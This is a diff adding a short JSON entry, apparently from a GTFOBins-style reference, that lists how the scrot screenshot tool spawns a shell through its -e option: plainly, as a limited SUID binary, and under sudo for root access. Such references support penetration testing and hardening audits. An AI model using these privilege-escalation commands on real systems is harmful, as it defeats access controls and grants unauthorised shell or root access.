@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "scrot -e /bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./scrot -e /bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo scrot -e /bin/sh\n"
+      }
+    ]
+  }
+}
